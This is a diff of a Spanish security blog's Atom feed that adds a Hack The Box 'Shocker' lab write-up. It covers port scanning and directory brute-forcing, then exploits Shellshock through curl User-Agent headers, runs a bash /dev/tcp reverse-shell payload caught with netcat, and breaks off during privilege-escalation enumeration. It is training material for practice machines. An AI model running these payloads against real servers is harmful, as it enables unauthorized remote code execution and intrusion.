@@ -1,4 +1,236 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-12T19:39:31-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box FriendZone</title><link href="http://localhost:4000/htb-friendzone/" rel="alternate" type="text/html" title="Hack The Box FriendZone" /><published>2021-12-12T00:00:00-06:00</published><updated>2021-12-12T00:00:00-06:00</updated><id>http://localhost:4000/htb-friendzone</id><content type="html" xml:base="http://localhost:4000/htb-friendzone/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-friendzone/banner-friendzone.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-16T22:41:25-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">K4miyo | Ciberseguridad!</title><subtitle>Artículos relacinados al hacking ético en diferentes plataformas</subtitle><author><name>K4miyo</name></author><entry><title type="html">Hack The Box Shocker</title><link href="http://localhost:4000/htb-shocker/" rel="alternate" type="text/html" title="Hack The Box Shocker" /><published>2021-12-16T00:00:00-06:00</published><updated>2021-12-16T00:00:00-06:00</updated><id>http://localhost:4000/htb-shocker</id><content type="html" xml:base="http://localhost:4000/htb-shocker/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-shocker/banner-shocker.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;shocker&quot;&gt;Shocker&lt;/h2&gt;
+&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.56.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.56
+PING 10.10.10.56 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.56&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
+64 bytes from 10.10.10.56: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;138 ms
+
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.56 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
+rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 137.542/137.542/137.542/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.56 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-12-12 19:49 CST
+Initiating Ping Scan at 19:49
+Scanning 10.10.10.56 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
+Completed Ping Scan at 19:49, 0.16s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating SYN Stealth Scan at 19:49
+Scanning 10.10.10.56 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
+Discovered open port 80/tcp on 10.10.10.56
+SYN Stealth Scan Timing: About 42.80% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 19:50 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:00:41 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Discovered open port 2222/tcp on 10.10.10.56
+Completed SYN Stealth Scan at 19:50, 65.49s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.56
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.16s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT     STATE SERVICE
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;65.79 seconds
+           Raw packets sent: 67488 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.969MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 67485 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.699MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
+───────┬───────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────
+   1   │ 
+   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
+   3   │ 
+   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.56
+   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 80,2222
+   6   │ 
+   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,2222 10.10.10.56 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-12-12 19:51 CST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.56
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos el puerto 80, así que antes de ver el contenido vía web, tenemos que ver a lo que nos enfrentamos con la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.56
+http://10.10.10.56 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.56]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No vemos nada relevante, así que ahora si visualizaremos el contenido vía web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-shocker/shocker-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tampoco vemos nada interesante, así que a este punto vamos a tratar de descubrir recursos dentro del servidor web y para variarle un poco, damos a utilizar la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; y el diccionario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/dirb/wordlists/common.txt&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.56 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/dirb/wordlists/common.txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 100
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Gobuster v3.1.0
+by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:                     http://10.10.10.56
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:                  GET
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:                 100
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Negative Status codes:   404
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:              gobuster/3.1.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:                 10s
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2021/12/16 21:15:30 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+/.htpasswd            &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 295]
+/.htaccess            &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 295]
+/.hta                 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 290]
+/cgi-bin/             &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 294]
+/index.html           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 137]
+/server-status        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 299]
+                                               
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2021/12/16 21:15:37 Finished
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aqui ya existe algo que nos llamada la atención, el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/&lt;/code&gt;, el cual es un recurso en donde por lo general se encuentran y se ejecutan scripts basados en Perl, .cgi shell, entre otros. Por lo que ya debemos estar pensando en tratar de identificar scripts con diversas extensiones, como por ejemplo sh, cgi, pl y por cualquier cosa, también buscaremos html, php y txt.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.10.56/cgi-bin/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; .sh .cgi .pl .html .php .txt &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 200
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Gobuster v3.1.0
+by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:                     http://10.10.10.56/cgi-bin/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:                  GET
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:                 200
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Negative Status codes:   404
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:              gobuster/3.1.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions:              sh
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:                 10s
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2021/12/16 21:23:59 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+/user.sh              &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 119]
+Progress: 109694 / 441122 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;24.87%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;            ^C
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Keyboard interrupt detected, terminating.
+                                               
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2021/12/16 21:25:16 Finished
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Encontramos un recurso llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user.sh&lt;/code&gt;, así que vamos a echarle un ojito.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-shocker/shocker-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A este punto, ya debemos estar pensando en el ataque &lt;a href=&quot;https://es.wikipedia.org/wiki/Shellshock_(error_de_software)&quot;&gt;&lt;strong&gt;&lt;em&gt;ShellSock&lt;/em&gt;&lt;/strong&gt;&lt;/a&gt;, así que vamos a tratar de explotarlo mediante la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent: () { :; }; whoami&quot;&lt;/span&gt; http://10.10.10.56/cgi-bin/user.sh
+&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE HTML PUBLIC &lt;span class=&quot;s2&quot;&gt;&quot;-//IETF//DTD HTML 2.0//EN&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&amp;lt;html&amp;gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&amp;lt;title&amp;gt;500 Internal Server Error&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;Internal Server Error&amp;lt;/h1&amp;gt;
+&amp;lt;p&amp;gt;The server encountered an internal error or
+misconfiguration and was unable to &lt;span class=&quot;nb&quot;&gt;complete
+&lt;/span&gt;your request.&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;Please contact the server administrator at 
+ webmaster@localhost to inform them of the &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;this error occurred,
+ and the actions you performed just before this error.&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;More information about this error may be available
+&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the server error log.&amp;lt;/p&amp;gt;
+&amp;lt;hr&amp;gt;
+&amp;lt;address&amp;gt;Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Server at 10.10.10.56 Port 80&amp;lt;/address&amp;gt;
+&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que nos manda un código de estado 500 &lt;em&gt;Internal Server Error&lt;/em&gt;, vamos a tratar de poner el comando bajo la ruta absoluta:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent: () { :; }; /usr/bin/whoami&quot;&lt;/span&gt; http://10.10.10.56/cgi-bin/user.sh
+&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE HTML PUBLIC &lt;span class=&quot;s2&quot;&gt;&quot;-//IETF//DTD HTML 2.0//EN&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&amp;lt;html&amp;gt;&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&amp;lt;title&amp;gt;500 Internal Server Error&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;Internal Server Error&amp;lt;/h1&amp;gt;
+&amp;lt;p&amp;gt;The server encountered an internal error or
+misconfiguration and was unable to &lt;span class=&quot;nb&quot;&gt;complete
+&lt;/span&gt;your request.&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;Please contact the server administrator at 
+ webmaster@localhost to inform them of the &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;this error occurred,
+ and the actions you performed just before this error.&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;More information about this error may be available
+&lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the server error log.&amp;lt;/p&amp;gt;
+&amp;lt;hr&amp;gt;
+&amp;lt;address&amp;gt;Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Server at 10.10.10.56 Port 80&amp;lt;/address&amp;gt;
+&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tampoco no le gusta, así que vamos a introducir un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo;&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent: () { :; }; echo; /usr/bin/whoami&quot;&lt;/span&gt; http://10.10.10.56/cgi-bin/user.sh
+shelly
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora si le gustó, ya tenemos ejecución de comando; por lo tanto vamos a tratar de entablarnos una reverse shell, asi que nos ponemos en escucha por el puerto 443:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent: () { :; }; echo; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.27/443 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt; http://10.10.10.56/cgi-bin/user.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.56] 56042
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+shelly@Shocker:/usr/lib/cgi-bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+whoami
+&lt;/span&gt;shelly
+shelly@Shocker:/usr/lib/cgi-bin&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos dentro de la máquina y podemos visualizar la flag (user.txt). Para trabajar más cómodos, vamos a hacer un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt;. Ahora vamos a enumerar un poco el sistema para ver una forma de escalar privilegios.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;shelly@Shocker:/home/shelly&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;shelly&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;shelly&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;shelly&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,24&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cdrom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,30&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,46&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plugdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,110&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lxd&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,115&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lpadmin&lt;span 